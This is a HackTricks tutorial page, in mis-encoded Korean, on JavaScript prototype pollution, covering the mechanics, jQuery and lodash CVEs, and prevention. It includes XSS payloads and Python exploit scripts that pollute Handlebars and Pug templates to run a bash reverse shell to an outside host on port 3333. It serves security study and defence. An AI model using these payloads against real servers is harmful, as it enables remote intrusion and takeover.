# NodeJS - \_\_proto\_\_ & prototype Pollution

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## JavaScriptì˜ ê°ì²´ <a href="#id-053a" id="id-053a"></a>

JavaScriptì˜ ê°ì²´ëŠ” ë³¸ì§ˆì ìœ¼ë¡œ ì†ì„±ìœ¼ë¡œ ì•Œë ¤ì§„ í‚¤-ê°’ ìŒì˜ ëª¨ìŒì…ë‹ˆë‹¤. ê°ì²´ëŠ” `Object.create`ë¥¼ ì‚¬ìš©í•˜ì—¬ `null`ì„ ì¸ìˆ˜ë¡œ ì „ë‹¬í•˜ì—¬ ë¹ˆ ê°ì²´ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë°©ë²•ì€ ìƒì†ëœ ì†ì„±ì´ ì—†ëŠ” ê°ì²´ë¥¼ ìƒì„±í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
ë¹ˆ ê°ì²´ëŠ” ë¹ˆ ì‚¬ì „ê³¼ ìœ ì‚¬í•˜ë©°, `{}`ë¡œ í‘œí˜„ë©ë‹ˆë‹¤.

### JavaScriptì˜ í•¨ìˆ˜ì™€ í´ë˜ìŠ¤

JavaScriptì—ì„œ í´ë˜ìŠ¤ì™€ í•¨ìˆ˜ëŠ” ë°€ì ‘í•˜ê²Œ ì—°ê²°ë˜ì–´ ìˆìœ¼ë©°, í•¨ìˆ˜ëŠ” ì¢…ì¢… í´ë˜ìŠ¤ì˜ ìƒì„±ìë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. JavaScriptëŠ” ê¸°ë³¸ì ì¸ í´ë˜ìŠ¤ ì§€ì›ì´ ì—†ì§€ë§Œ, ìƒì„±ìëŠ” í´ë˜ìŠ¤ ë™ì‘ì„ ëª¨ë°©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototypes in JavaScript

JavaScriptëŠ” ëŸ°íƒ€ì„ì— í”„ë¡œí† íƒ€ì… ì†ì„±ì„ ìˆ˜ì •, ì¶”ê°€ ë˜ëŠ” ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ìœ ì—°ì„±ì€ í´ë˜ìŠ¤ ê¸°ëŠ¥ì˜ ë™ì  í™•ì¥ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

`toString` ë° `valueOf`ì™€ ê°™ì€ í•¨ìˆ˜ëŠ” ê·¸ ë™ì‘ì„ ë³€ê²½í•˜ë„ë¡ ìˆ˜ì •ë  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” JavaScriptì˜ í”„ë¡œí† íƒ€ì… ì‹œìŠ¤í…œì˜ ì ì‘ ê°€ëŠ¥í•œ íŠ¹ì„±ì„ ë³´ì—¬ì¤ë‹ˆë‹¤.

## Inheritance

í”„ë¡œí† íƒ€ì… ê¸°ë°˜ í”„ë¡œê·¸ë˜ë°ì—ì„œ ì†ì„±/ë©”ì„œë“œëŠ” í´ë˜ìŠ¤ì—ì„œ ê°ì²´ë¡œ ìƒì†ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ í´ë˜ìŠ¤ëŠ” ë‹¤ë¥¸ í´ë˜ìŠ¤ì˜ ì¸ìŠ¤í„´ìŠ¤ë‚˜ ë¹ˆ ê°ì²´ì— ì†ì„±/ë©”ì„œë“œë¥¼ ì¶”ê°€í•˜ì—¬ ìƒì„±ë©ë‹ˆë‹¤.

ë‹¤ë¥¸ ê°ì²´ì˜ í”„ë¡œí† íƒ€ì… ì—­í• ì„ í•˜ëŠ” ê°ì²´(ì˜ˆ: `myPersonObj`)ì— ì†ì„±ì´ ì¶”ê°€ë˜ë©´, ìƒì†ë°›ëŠ” ê°ì²´ëŠ” ì´ ìƒˆë¡œìš´ ì†ì„±ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ì†ì„±ì€ ëª…ì‹œì ìœ¼ë¡œ í˜¸ì¶œë˜ì§€ ì•ŠëŠ” í•œ ìë™ìœ¼ë¡œ í‘œì‹œë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

## \_\_proto\_\_ pollution <a href="#id-0d0a" id="id-0d0a"></a>

## Exploring Prototype Pollution in JavaScript

JavaScript ê°ì²´ëŠ” í‚¤-ê°’ ìŒìœ¼ë¡œ ì •ì˜ë˜ë©° JavaScript Object í”„ë¡œí† íƒ€ì…ì—ì„œ ìƒì†ë©ë‹ˆë‹¤. ì´ëŠ” Object í”„ë¡œí† íƒ€ì…ì„ ë³€ê²½í•˜ë©´ í™˜ê²½ ë‚´ì˜ ëª¨ë“  ê°ì²´ì— ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ë‹¤ë¥¸ ì˜ˆì œë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¤ëª…í•´ ë³´ê² ìŠµë‹ˆë‹¤:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Object í”„ë¡œí† íƒ€ì…ì— ëŒ€í•œ ì ‘ê·¼ì€ ë‹¤ìŒì„ í†µí•´ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Object í”„ë¡œí† íƒ€ì…ì— ì†ì„±ì„ ì¶”ê°€í•¨ìœ¼ë¡œì¨, ëª¨ë“  JavaScript ê°ì²´ëŠ” ì´ëŸ¬í•œ ìƒˆë¡œìš´ ì†ì„±ì„ ìƒì†ë°›ê²Œ ë©ë‹ˆë‹¤:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## prototype pollution

`__proto__` ì‚¬ìš©ì´ ì œí•œëœ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” í•¨ìˆ˜ì˜ í”„ë¡œí† íƒ€ì…ì„ ìˆ˜ì •í•˜ëŠ” ê²ƒì´ ëŒ€ì•ˆì…ë‹ˆë‹¤:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
ì´ê²ƒì€ `Vehicle` ìƒì„±ìì—ì„œ ìƒì„±ëœ ê°ì²´ì—ë§Œ ì˜í–¥ì„ ë¯¸ì¹˜ë©°, ì´ë“¤ì—ê²Œ `beep`, `hasWheels`, `honk`, ë° `isElectric` ì†ì„±ì„ ë¶€ì—¬í•©ë‹ˆë‹¤.

í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ í†µí•´ JavaScript ê°ì²´ì— ì „ì—­ì ìœ¼ë¡œ ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ë‘ ê°€ì§€ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. `Object.prototype`ë¥¼ ì§ì ‘ ì˜¤ì—¼ì‹œí‚¤ê¸°:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” êµ¬ì¡°ì²´ì˜ ìƒì„±ì í”„ë¡œí† íƒ€ì… ì˜¤ì—¼:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
ì´ ì‘ì—… í›„, ëª¨ë“  JavaScript ê°ì²´ëŠ” `goodbye` ë° `greet` ë©”ì„œë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë‹¤ë¥¸ ê°ì²´ ì˜¤ì—¼ì‹œí‚¤ê¸°

### í´ë˜ìŠ¤ì—ì„œ Object.prototypeìœ¼ë¡œ

íŠ¹ì • ê°ì²´ë¥¼ **ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆëŠ”** ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ **`Object.prototype`ì— ì ‘ê·¼í•´ì•¼** í•˜ëŠ” ê²½ìš°, ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œë¡œ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Array elements pollution

JSì—ì„œ ê°ì²´ì˜ ì†ì„±ì„ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆëŠ” ê²ƒì²˜ëŸ¼, ë°°ì—´ì— ì ‘ê·¼í•˜ì—¬ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆë‹¤ë©´ **ì¸ë±ìŠ¤ë¥¼ í†µí•´ ì ‘ê·¼ ê°€ëŠ¥í•œ ë°°ì—´ì˜ ê°’**ë„ **ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆë‹¤**ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš” (ê°’ì„ ë®ì–´ì“¸ ìˆ˜ëŠ” ì—†ìœ¼ë¯€ë¡œ, ì–´ë–¤ ì‹ìœ¼ë¡œë“  ì‚¬ìš©ë˜ì§€ë§Œ ì‘ì„±ë˜ì§€ ì•Šì€ ì¸ë±ìŠ¤ë¥¼ ì˜¤ì—¼ì‹œì¼œì•¼ í•©ë‹ˆë‹¤).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elements pollution

JSë¥¼ í†µí•´ HTML ìš”ì†Œë¥¼ ìƒì„±í•  ë•Œ **`innerHTML`** ì†ì„±ì„ **ë®ì–´ì“¸** ìˆ˜ ìˆì–´ **ì„ì˜ì˜ HTML ì½”ë“œ**ë¥¼ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [ì´ ê¸€ì—ì„œ ì•„ì´ë””ì–´ì™€ ì˜ˆì‹œ](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)ì…ë‹ˆë‹¤.

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Examples

### Basic Example

í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì€ `Object.prototype`ì˜ ì†ì„±ì„ ë®ì–´ì“¸ ìˆ˜ ìˆëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ê²°í•¨ìœ¼ë¡œ ì¸í•´ ë°œìƒí•©ë‹ˆë‹¤. ì´ëŠ” ëŒ€ë¶€ë¶„ì˜ ê°ì²´ê°€ `Object.prototype`ì—ì„œ ì†ì„±ì„ íŒŒìƒí•˜ê¸° ë•Œë¬¸ì— ì˜ë¯¸í•©ë‹ˆë‹¤.

ê°€ì¥ ì‰¬ìš´ ì˜ˆëŠ” í™•ì¸ë  **ì •ì˜ë˜ì§€ ì•Šì€ ê°ì²´ì˜ ì†ì„±**ì— ê°’ì„ ì¶”ê°€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
```javascript
if (user.admin) {
```
If the attribute **`admin` is undefined** it's possible to abuse a PP and set it to True with something like:  
ì†ì„±ì´ **`admin`ì´ ì •ì˜ë˜ì§€ ì•Šì€ ê²½ìš°** PPë¥¼ ì•…ìš©í•˜ì—¬ ë‹¤ìŒê³¼ ê°™ì´ Trueë¡œ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
ì´ ë©”ì»¤ë‹ˆì¦˜ì€ ê³µê²©ìê°€ íŠ¹ì • ì…ë ¥ì„ ì œì–´í•  ìˆ˜ ìˆëŠ” ê²½ìš° ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ëª¨ë“  ê°ì²´ì˜ í”„ë¡œí† íƒ€ì…ì„ ìˆ˜ì •í•  ìˆ˜ ìˆë„ë¡ ì†ì„±ì„ ì¡°ì‘í•˜ëŠ” ê²ƒê³¼ ê´€ë ¨ì´ ìˆìŠµë‹ˆë‹¤. ì´ ì¡°ì‘ì€ ì¼ë°˜ì ìœ¼ë¡œ `__proto__` ì†ì„±ì„ ì„¤ì •í•˜ëŠ” ê²ƒì„ í¬í•¨í•˜ë©°, JavaScriptì—ì„œ ì´ëŠ” ê°ì²´ì˜ í”„ë¡œí† íƒ€ì…ì„ ì§ì ‘ ìˆ˜ì •í•˜ëŠ” ê²ƒê³¼ ë™ì˜ì–´ì…ë‹ˆë‹¤.

ì´ ê³µê²©ì´ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰ë  ìˆ˜ ìˆëŠ” ì¡°ê±´ì€ íŠ¹ì • [ì—°êµ¬](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf)ì—ì„œ ì„¤ëª…ëœ ë°”ì™€ ê°™ì´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* ì¬ê·€ì  ë³‘í•© ìˆ˜í–‰.
* ê²½ë¡œì— ë”°ë¼ ì†ì„± ì •ì˜.
* ê°ì²´ ë³µì œ.

### Override function
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution to RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

ë‹¤ë¥¸ í˜ì´ë¡œë“œ:

* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## í´ë¼ì´ì–¸íŠ¸ ì¸¡ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ í†µí•œ XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: jQuery $ .extendë¥¼ í†µí•œ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ê³µê²©

[ìì„¸í•œ ë‚´ìš©ì€ ì´ ê¸°ì‚¬ë¥¼ í™•ì¸í•˜ì„¸ìš”](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) jQueryì—ì„œ `$ .extend` í•¨ìˆ˜ëŠ” ê¹Šì€ ë³µì‚¬ ê¸°ëŠ¥ì´ ì˜ëª» ì‚¬ìš©ë  ê²½ìš° í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ê°ì²´ë¥¼ ë³µì œí•˜ê±°ë‚˜ ê¸°ë³¸ ê°ì²´ì˜ ì†ì„±ì„ ë³‘í•©í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì˜ëª» êµ¬ì„±ë˜ë©´ ìƒˆë¡œìš´ ê°ì²´ë¥¼ ìœ„í•œ ì†ì„±ì´ ëŒ€ì‹  í”„ë¡œí† íƒ€ì…ì— í• ë‹¹ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
ì´ ì·¨ì•½ì ì€ CVE-2019â€“11358ë¡œ ì‹ë³„ë˜ë©°, ê¹Šì€ ë³µì‚¬ê°€ ì–´ë–»ê²Œ ìš°ì—°íˆ í”„ë¡œí† íƒ€ì…ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ”ì§€ë¥¼ ë³´ì—¬ì¤ë‹ˆë‹¤. ì´ëŠ” `isAdmin`ê³¼ ê°™ì€ ì†ì„±ì´ ì ì ˆí•œ ì¡´ì¬ í™•ì¸ ì—†ì´ í™•ì¸ë  ê²½ìš° ë¬´ë‹¨ ê´€ë¦¬ì ì ‘ê·¼ê³¼ ê°™ì€ ì ì¬ì ì¸ ë³´ì•ˆ ìœ„í—˜ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### CVE-2018â€“3721, CVE-2019â€“10744: lodashë¥¼ í†µí•œ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ê³µê²©

[ìì„¸í•œ ë‚´ìš©ì€ ì´ ê¸°ì‚¬ë¥¼ í™•ì¸í•˜ì„¸ìš”](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash)ëŠ” ìœ ì‚¬í•œ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì (CVE-2018â€“3721, CVE-2019â€“10744)ì— ì§ë©´í–ˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ë¬¸ì œëŠ” ë²„ì „ 4.17.11ì—ì„œ í•´ê²°ë˜ì—ˆìŠµë‹ˆë‹¤.

### CVEê°€ í¬í•¨ëœ ë˜ ë‹¤ë¥¸ íŠœí† ë¦¬ì–¼

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ íƒì§€í•˜ëŠ” ë„êµ¬

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì„œë²„ ì¸¡ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì„ íƒì§€í•˜ê³  ë¶„ì„í•˜ê¸° ìœ„í•´ ì„¤ê³„ëœ Burp Suite í™•ì¥ì…ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” ìš”ì²­ì„ ìŠ¤ìº”í•˜ì—¬ ì ì¬ì ì¸ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ë¬¸ì œë¥¼ ì‹ë³„í•˜ëŠ” ê³¼ì •ì„ ìë™í™”í•©ë‹ˆë‹¤. íŠ¹íˆ Node.js ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ì¤‘ì ì„ ë‘ê³  í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ í™œìš©í•˜ì—¬ í•´ë¡œìš´ ì‘ì—…ì„ ì‹¤í–‰í•˜ëŠ” ì•Œë ¤ì§„ ê°€ì ¯ì„ ì•…ìš©í•©ë‹ˆë‹¤.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): ì´ í™•ì¥ì€ ì„œë²„ ì¸¡ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì„ ì‹ë³„í•©ë‹ˆë‹¤. [ì„œë²„ ì¸¡ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼](https://portswigger.net/research/server-side-prototype-pollution)ì—ì„œ ì„¤ëª…ëœ ê¸°ìˆ ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

### NodeJSì˜ AST í”„ë¡œí† íƒ€ì… ì˜¤ì—¼

NodeJSëŠ” í…œí”Œë¦¿ ì—”ì§„ ë° TypeScriptì™€ ê°™ì€ ê¸°ëŠ¥ì„ ìœ„í•´ JavaScriptì—ì„œ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬(AST)ë¥¼ ê´‘ë²”ìœ„í•˜ê²Œ í™œìš©í•©ë‹ˆë‹¤. ì´ ì„¹ì…˜ì—ì„œëŠ” Handlebars ë° Pugì™€ ê°™ì€ í…œí”Œë¦¿ ì—”ì§„ì—ì„œì˜ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ê³¼ ê´€ë ¨ëœ ì·¨ì•½ì ì„ íƒêµ¬í•©ë‹ˆë‹¤.

#### Handlebars ì·¨ì•½ì  ë¶„ì„

Handlebars í…œí”Œë¦¿ ì—”ì§„ì€ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ê³µê²©ì— ì·¨ì•½í•©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ `javascript-compiler.js` íŒŒì¼ ë‚´ì˜ íŠ¹ì • í•¨ìˆ˜ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `appendContent` í•¨ìˆ˜ëŠ” `pendingContent`ê°€ ì¡´ì¬í•  ê²½ìš° ì´ë¥¼ ì—°ê²°í•˜ê³ , `pushSource` í•¨ìˆ˜ëŠ” ì†ŒìŠ¤ë¥¼ ì¶”ê°€í•œ í›„ `pendingContent`ë¥¼ `undefined`ë¡œ ì¬ì„¤ì •í•©ë‹ˆë‹¤.

**ì•…ìš© ê³¼ì •**

ì•…ìš©ì€ Handlebarsì— ì˜í•´ ìƒì„±ëœ AST(ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬)ë¥¼ í™œìš©í•˜ì—¬ ë‹¤ìŒ ë‹¨ê³„ë¥¼ ë”°ë¦…ë‹ˆë‹¤:

1. **íŒŒì„œ ì¡°ì‘**: ì²˜ìŒì— íŒŒì„œëŠ” `NumberLiteral` ë…¸ë“œë¥¼ í†µí•´ ê°’ì´ ìˆ«ìì—¬ì•¼ í•œë‹¤ê³  ê°•ì œí•©ë‹ˆë‹¤. í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì€ ì´ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆì–´ ë¹„ìˆ«ì ë¬¸ìì—´ì„ ì‚½ì…í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
2. **ì»´íŒŒì¼ëŸ¬ì— ì˜í•œ ì²˜ë¦¬**: ì»´íŒŒì¼ëŸ¬ëŠ” AST ê°ì²´ ë˜ëŠ” ë¬¸ìì—´ í…œí”Œë¦¿ì„ ì²˜ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `input.type`ì´ `Program`ê³¼ ê°™ìœ¼ë©´ ì…ë ¥ì´ ë¯¸ë¦¬ íŒŒì‹±ëœ ê²ƒìœ¼ë¡œ ì²˜ë¦¬ë˜ë©°, ì´ëŠ” ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. **ì½”ë“œ ì£¼ì…**: `Object.prototype`ì„ ì¡°ì‘í•˜ì—¬ í…œí”Œë¦¿ í•¨ìˆ˜ì— ì„ì˜ì˜ ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Handlebars ì·¨ì•½ì ì˜ ì•…ìš©ì„ ë³´ì—¬ì£¼ëŠ” ì˜ˆ:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
ì´ ì½”ë“œëŠ” ê³µê²©ìê°€ Handlebars í…œí”Œë¦¿ì— ì„ì˜ì˜ ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤.

**ì™¸ë¶€ ì°¸ì¡°**: 'flat' ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ê³¼ ê´€ë ¨ëœ ë¬¸ì œê°€ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”: [GitHubì˜ ë¬¸ì œ](https://github.com/hughsk/flat/issues/105).

**ì™¸ë¶€ ì°¸ì¡°**: [â€˜flatâ€™ ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ê³¼ ê´€ë ¨ëœ ë¬¸ì œ](https://github.com/hughsk/flat/issues/105)

Pythonì—ì„œ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì•…ìš©ì˜ ì˜ˆ:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug ì·¨ì•½ì 

PugëŠ” ë˜ ë‹¤ë¥¸ í…œí”Œë¦¿ ì—”ì§„ìœ¼ë¡œ, í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì˜ ìœ ì‚¬í•œ ìœ„í—˜ì— ì§ë©´í•´ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ì •ë³´ëŠ” [Pugì˜ AST ì£¼ì…](https://blog.p6.is/AST-Injection/#Pug) ë…¼ì˜ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Pugì—ì„œì˜ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì˜ˆì‹œ:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### ì˜ˆë°© ì¡°ì¹˜

í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì˜ ìœ„í—˜ì„ ì¤„ì´ê¸° ìœ„í•´ ì•„ë˜ì˜ ì „ëµì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. **ê°ì²´ ë¶ˆë³€ì„±**: `Object.prototype`ì„ `Object.freeze`ë¥¼ ì ìš©í•˜ì—¬ ë¶ˆë³€ìœ¼ë¡œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. **ì…ë ¥ ê²€ì¦**: JSON ì…ë ¥ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ìŠ¤í‚¤ë§ˆì— ëŒ€í•´ ì² ì €íˆ ê²€ì¦í•´ì•¼ í•©ë‹ˆë‹¤.
3. **ì•ˆì „í•œ ë³‘í•© í•¨ìˆ˜**: ì¬ê·€ ë³‘í•© í•¨ìˆ˜ì˜ ì•ˆì „í•˜ì§€ ì•Šì€ ì‚¬ìš©ì€ í”¼í•´ì•¼ í•©ë‹ˆë‹¤.
